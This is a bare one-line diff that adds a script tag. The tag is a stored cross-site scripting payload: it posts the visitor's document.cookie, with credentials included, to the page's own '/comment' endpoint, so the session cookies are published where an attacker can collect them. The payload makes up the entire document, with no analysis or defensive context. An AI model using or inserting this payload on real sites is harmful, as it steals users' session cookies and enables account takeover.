@@ -1,0 +1,1 @@
+<script>fetch(location.pathname+"/comment",{method:"POST",credentials:"include",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:"content="+encodeURIComponent(document.cookie)})</script>
